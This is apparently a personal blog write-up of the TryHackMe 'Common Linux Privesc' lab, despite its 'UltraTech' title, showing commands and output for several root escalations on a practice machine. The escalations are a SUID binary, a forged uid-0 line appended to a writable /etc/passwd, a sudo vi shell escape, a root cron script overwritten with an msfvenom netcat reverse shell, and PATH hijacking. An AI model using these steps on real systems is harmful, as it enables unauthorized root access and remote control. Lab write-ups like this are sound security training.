---
layout: post
title:  "UltraTech"
date:   2024-02-11 12:50:01 -0600
categories: TryHackMe
image: /assets/img/common-linux-privesc.png
---
[Common Linux Privesc](https://tryhackme.com/room/commonlinuxprivesc)
A room explaining common Linux privilege escalation
first edit the host file and begin

```
echo "10.10.67.249 linux" >> /etc/hosts
```
No need to enumerate as we get the ssh user right away, let's login
```
ssh user3@linux
The authenticity of host 'linux (10.10.67.249)' can't be established.
ECDSA key fingerprint is SHA256:z779uy6zga16Ydh/GxyQkGuYtyHQ+G5YeL1MHE+VYdQ.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'linux,10.10.67.249' (ECDSA) to the list of known hosts.
user3@linux's password: 
Welcome to Linux Lite 4.4 (GNU/Linux 4.15.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

413 packages can be updated.
195 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Welcome to Linux Lite 4.4 user3
 
Sunday 11 February 2024, 17:13:49
Memory Usage: 340/1991MB (17.08%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)

```
How many users are there?
I'm not good at finding where these are but figured start with /etc/passwd.
But then how to use grep properly for this?
```
user3@polobox:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:117:Light Display Manager:/var/lib/lightdm:/bin/false
ntp:x:109:119::/home/ntp:/bin/false
avahi:x:110:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
colord:x:111:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
nm-openconnect:x:114:124:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/bin/false
nm-openvpn:x:115:125:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/bin/false
pulse:x:116:126:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:117:128:RealtimeKit,,,:/proc:/bin/false
saned:x:118:129::/var/lib/saned:/bin/false
usbmux:x:119:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
geoclue:x:103:105::/var/lib/geoclue:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
user1:x:1000:1000:user1,,,:/home/user1:/bin/bash
user2:x:1001:1001:user2,,,:/home/user2:/bin/bash
user3:x:1002:1002:user3,,,:/home/user3:/bin/bash
user4:x:1003:1003:user4,,,:/home/user4:/bin/bash
statd:x:120:65534::/var/lib/nfs:/usr/sbin/nologin
user5:x:1004:1004:user5,,,:/home/user5:/bin/bash
user6:x:1005:1005:user6,,,:/home/user6:/bin/bash
mysql:x:121:131:MySQL Server,,,:/var/mysql:/bin/bash
user7:x:1006:0:user7,,,:/home/user7:/bin/bash
user8:x:1007:1007:user8,,,:/home/user8:/bin/bash
sshd:x:122:65534::/run/sshd:/usr/sbin/nologin
user3@polobox:~$ grep /etc/passwd -e 'user[0-9]'
user1:x:1000:1000:user1,,,:/home/user1:/bin/bash
user2:x:1001:1001:user2,,,:/home/user2:/bin/bash
user3:x:1002:1002:user3,,,:/home/user3:/bin/bash
user4:x:1003:1003:user4,,,:/home/user4:/bin/bash
user5:x:1004:1004:user5,,,:/home/user5:/bin/bash
user6:x:1005:1005:user6,,,:/home/user6:/bin/bash
user7:x:1006:0:user7,,,:/home/user7:/bin/bash
user8:x:1007:1007:user8,,,:/home/user8:/bin/bash
user3@polobox:~$ grep /etc/passwd -e 'user[0-9]' | wc -l
8
``` 
Now how many shells?  Had to google this one
```
user3@polobox:~$ grep /etc/shells -e bin 
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
user3@polobox:~$ grep /etc/shells -e bin | wc -l
4
```
What is the name of the bash script that is set to run every 5 minutes by cron?
```
user3@polobox:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/5  *    * * * root    /home/user4/Desktop/autoscript.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```
What critical file has had its permissions changed to allow some users to write to it?

/etc/passwd has 664 instead of 644 permissions, but since the group is root this is not that big of a deal.
```
user3@polobox:~$ ls -la /etc/passwd
-rw-rw-r-- 1 root root 2694 Mar  6  2020 /etc/passwd
```
Although this doesn't tell me which script ran this, so I decided to get the LinEnum and linpeas scripts and see what I can gether from those.  After I pushed it to the server got the results

```
From my Attackbox (new shell)
root@ip-10-10-127-16:~# python3 -m http.server 9000


polobox:~$ wget http://10.10.127.16:9000/LinEnum.sh
polobox:~$ ./LinEnum.sh > LinEnum.txt
polobox:~$ wget http://10.10.127.16:9000/linpeas.sh
polobox:~$ ./linpeas > linpeas.txt

From linux box (new shell)
user3@polobox:~$ python3 -m http.server 9999

Attack box:
root@ip-10-10-127-16:~# wget http://linux:9999/LinEnum.txt
root@ip-10-10-127-16:~# wget http://linux:9999/linpeas.txt

root@ip-10-10-127-16:~# less -r LinEnum.txt
root@ip-10-10-127-16:~# less -r linpeas.txt




```
00;31m[-] Can we read/write sensitive files:
-rw-rw-r-- 1 root root 2694 Mar  6  2020 /etc/passwd
-rw-r--r-- 1 root root 1087 Jun  5  2019 /etc/group
-rw-r--r-- 1 root root 581 Apr 22  2016 /etc/profile
-rw-r----- 1 root shadow 2359 Mar  6  2020 /etc/shadow

The script for this in LinEnum is this:
```
ls -la /etc/passwd 2>/dev/null 
```
## Abusing SUID/GUID Files
What is the path of the file in user3’s directory that stands out to you?
```
user3@polobox:~$ find ~ -perm -u=s -type f 2>/dev/null
/home/user3/shell
```
We know that "shell" is an SUID bit file, therefore running it will run the script as a root user! Lets run it!

We can do this by running: "./shell"
```
user3@polobox:~$ ./shell
You Can't Find Me
Welcome to Linux Lite 4.4 user3
 
Sunday 11 February 2024, 18:11:12
Memory Usage: 350/1991MB (17.58%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
root@polobox:~# id
uid=0(root) gid=0(root) groups=0(root),1002(user3)
root@polobox:~# whoami
root
root@polobox:~# 

```
## Exploiting Writeable /etc/passwd

First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user7, with the password "password"
```
root@polobox:~# exit
exit
user3@polobox:~$ su user7
Password: 
Welcome to Linux Lite 4.4 user7
 
Sunday 11 February 2024, 18:13:11
Memory Usage: 350/1991MB (17.58%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
user7@polobox:/home/user3$ 

```
Having read the information above, what direction privilege escalation is this attack?

Exiting out of a root shell and moving horizontally could be considered a vertical privilege deescalation.

Create a compliant password hash to add with: “openssl passwd -1 -salt [salt] [password]”. What is the hash created by using this command with the salt, “new” and the password “123”?
```
user7@polobox:/home/user3$ openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1

```
What would the /etc/passwd entry look like for a root user with the username “new” and the password hash we created before?
```
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```
Great! Now you've got everything you need. Just add that entry to the end of the /etc/passwd file!
```
ser7@polobox:/home/user3$ echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
user7@polobox:/home/user3$ su new
Password: 
Welcome to Linux Lite 4.4
 
You are running in superuser mode, be very careful.
 
Sunday 11 February 2024, 18:18:54
Memory Usage: 353/1991MB (17.73%)
Disk Usage: 6/217GB (3%)
 
root@polobox:/home/user3# 
```
## Escaping Vi Editor

First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user8, with the password "password"
```
root@polobox:/home/user3# exit
exit
user7@polobox:/home/user3$ su user8
Password: 
Welcome to Linux Lite 4.4 user8
 
Sunday 11 February 2024, 18:20:36
Memory Usage: 353/1991MB (17.73%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
user8@polobox:/home/user3$ 
```
Let's use the "sudo -l" command, what does this user require (or not require) to run vi as root?
```
user8@polobox:/home/user3$ sudo -l
Matching Defaults entries for user8 on polobox:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user8 may run the following commands on polobox:
    (root) NOPASSWD: /usr/bin/vi
user8@polobox:/home/user3$ 
```

So, all we need to do is open vi as root, by typing "sudo vi" into the terminal.
Now, type ":!sh" to open a shell!
```
user8@polobox:/home/user3$ sudo vi

# id
uid=0(root) gid=0(root) groups=0(root)
```

## Exploiting Crontab

First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user4, with the password "password"
```
user8@polobox:/home/user3$ su user4
Password: 
Welcome to Linux Lite 4.4 user4
 
Sunday 11 February 2024, 18:25:51
Memory Usage: 356/1991MB (17.88%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
user4@polobox:/home/user3$ 
```
Now, on our host machine- let's create a payload for our cron exploit using msfvenom. 
```
root@ip-10-10-127-16:~# msfvenom -p cmd/unix/reverse_netcat lhost=10.10.127.16 lport=8888 R
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 94 bytes
mkfifo /tmp/rbbvv; nc 10.10.127.16 8888 0</tmp/rbbvv | /bin/sh >/tmp/rbbvv 2>&1; rm /tmp/rbbvv
root@ip-10-10-127-16:~# 
```
What directory is the “autoscript.sh” under?
```
user4@polobox:/home/user3$ grep user4 /etc/crontab
*/5  *    * * * root    /home/user4/Desktop/autoscript.sh
```
Lets replace the contents of the file with our payload using: "echo [MSFVENOM OUTPUT] > autoscript.sh"
```
user4@polobox:/home/user3$ echo "mkfifo /tmp/rbbvv; nc 10.10.127.16 8888 0</tmp/rbbvv | /bin/sh >/tmp/rbbvv 2>&1; rm /tmp/rbbvv
> " > autoscript.sh
bash: autoscript.sh: Permission denied
user4@polobox:/home/user3$ cd /home/user4
user4@polobox:~$ ls
abc.txt  Documents  Music     Public     Videos
Desktop  Downloads  Pictures  Templates
user4@polobox:~$ cd Desktop/
user4@polobox:~/Desktop$ ls
autoscript.sh     helpmanual.desktop  recyclebin.desktop  userfiles.desktop
computer.desktop  network.desktop     settings.desktop
user4@polobox:~/Desktop$ echo "mkfifo /tmp/rbbvv; nc 10.10.127.16 8888 0</tmp/rbbvv | /bin/sh >/tmp/rbbvv 2>&1; rm /tmp/rbbvv
> " > autoscript.sh
user4@polobox:~/Desktop$ cat autoscript.sh 
mkfifo /tmp/rbbvv; nc 10.10.127.16 8888 0</tmp/rbbvv | /bin/sh >/tmp/rbbvv 2>&1; rm /tmp/rbbvv

user4@polobox:~/Desktop$ id
uid=1003(user4) gid=1003(user4) groups=1003(user4),0(root)
user4@polobox:~/Desktop$ 


Attack box:
root@ip-10-10-127-16:~# nc -lvnp 8888
Listening on [0.0.0.0] (family 0, port 8888)

5 minutes later on Attack box
root@ip-10-10-127-16:~# nc -lvnp 8888
Listening on [0.0.0.0] (family 0, port 8888)
Connection from 10.10.67.249 39906 received!
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
id
uid=0(root) gid=0(root) groups=0(root)

```
## Exploiting PATH Variable

Going back to our local ssh session, not the netcat root session, you can close that now, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user5, with the password "password"
```
ser4@polobox:~/Desktop$ su user5
Password: 
Welcome to Linux Lite 4.4 user5
 
Sunday 11 February 2024, 18:42:45
Memory Usage: 359/1991MB (18.03%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
user5@polobox:/home/user4/Desktop$ 
```

Let’s go to user5’s home directory, and run the file “script”. What command do we think that it’s executing?
```
Desktop  Documents  Downloads  Music  Pictures  Public  script  Templates  Videos
user5@polobox:~$ ./script
Desktop  Documents  Downloads  Music  Pictures	Public	script	Templates  Videos
user5@polobox:~$ 
```
Putting it all together!
```
user5@polobox:/tmp$ echo "/bin/bash" > ls
user5@polobox:/tmp$ chmod +x ls
user5@polobox:/tmp$ export PATH=/tmp:$PATH
user5@polobox:/tmp$ cd ~
user5@polobox:~$ ./script
Welcome to Linux Lite 4.4 user5
 
Sunday 11 February 2024, 18:47:55
Memory Usage: 361/1991MB (18.13%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
root@polobox:~# id
uid=0(root) gid=0(root) groups=0(root),1004(user5)

```
Clean up:
```
root@polobox:~# exit
exit
user5@polobox:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
user5@polobox:~$ 
```
